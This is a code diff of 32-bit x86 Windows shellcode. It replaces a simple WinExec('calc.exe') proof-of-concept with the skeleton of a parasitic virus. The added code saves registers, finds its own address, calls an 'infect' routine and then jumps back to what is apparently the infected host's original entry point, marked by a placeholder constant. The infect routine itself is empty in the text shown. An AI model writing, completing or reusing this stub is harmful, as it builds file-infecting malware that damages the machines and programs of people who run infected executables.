@@ -1,5 +1,12 @@
 [bits 32]
 
+start:
+push esi
+push edi
+push ebx
+push ecx
+push ebp
+
 mov eax, [fs:0x30] 
 mov eax, [eax+0xc]
 mov eax, [eax+0x14]
@@ -51,19 +58,35 @@ add ebx, 8  ; # ????????
 mov ebx, [ebx]
 add ebx, ebp
 
-call _winexec
-db "WinExec", 0
-_winexec:
+; assume ebx had GetProcAddress
+
+push 0xc0d31235
+
+call next_instr
+next_instr:
+pop eax
+sub eax, next_instr - start
+push eax
+
 push ebp
-call ebx
+push ebx
 
+call infect
+call addr_instr
+addr_instr:
+pop eax
+sub eax, addr_instr - start
+sub eax, 0xc0d31234
 
-call _calc
-db "calc.exe", 0
-_calc:
-call eax
+pop ebp
+pop ecx
+pop ebx
+pop edi
+pop esi
+jmp eax
 
-jmp $ 
+infect:
+
 
 
 
